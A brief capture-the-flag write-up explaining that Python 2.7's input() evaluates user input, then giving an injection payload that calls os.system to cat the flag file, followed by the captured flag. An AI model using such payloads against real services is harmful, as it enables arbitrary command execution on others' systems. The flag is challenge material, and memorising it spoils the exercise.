* Using `print ""` indicates that this is python2.7, which has a vulnerability in the input() function that evaluates input


* We can input the following payload to get the flag:
```
__import__('os').system('cat valentine.txt')
```

`valentine{0ops_i_go7_hydrog3n_ball00n5_NONOWHEREAREYOUGOINGWITHTHATLIGHTER}`
